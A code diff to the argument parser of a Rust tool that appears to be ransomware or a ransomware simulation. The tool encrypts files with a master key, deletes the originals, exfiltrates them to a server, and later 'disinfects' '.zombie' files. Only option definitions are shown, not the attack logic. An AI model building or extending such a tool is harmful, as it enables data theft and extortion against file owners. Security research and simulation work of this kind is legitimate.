@@ -36,15 +36,15 @@ struct EncryptArgs {
     #[arg(short = 'k', long, default_value = "master-public.key")]
     key: PathBuf,
 
-    /// Do not delete original files after encryption--encryption mode only
+    /// Do not delete original files after encryption
     #[arg(short = 'n', long)]
     no_delete: bool,
 
-    /// Server address for exfiltration--encryption mode only
+    /// Server address for exfiltration
     #[arg(short = 's', long, default_value = "http://localhost:8080")]
     server: String,
 
-    /// Target folder on the server for exfiltration--encryption mode only
+    /// Target folder on the server for exfiltration
     #[arg(short = 't', long)]
     target_folder: Option<String>,
 }
@@ -59,6 +59,10 @@ struct DecryptArgs {
     /// Path to the master private key
     #[arg(short = 'k', long, default_value = "master-private.key")]
     key: PathBuf,
+
+    /// Do not delete .zombie files after decryption
+    #[arg(short = 'n', long)]
+    no_delete: bool,
 }
 
 #[derive(Parser, Debug)]
@@ -92,7 +96,7 @@ pub fn run() -> Result<(), AppError> {
             &args.server,
             &args.target_folder,
         ),
-        Cli::Decrypt(args) => disinfect(&args.path, &args.key),
+        Cli::Decrypt(args) => disinfect(&args.path, &args.key, &args.no_delete),
         Cli::Generate(args) => {
             // must convert CryptoError to AppError
             generate(&args.path)?;
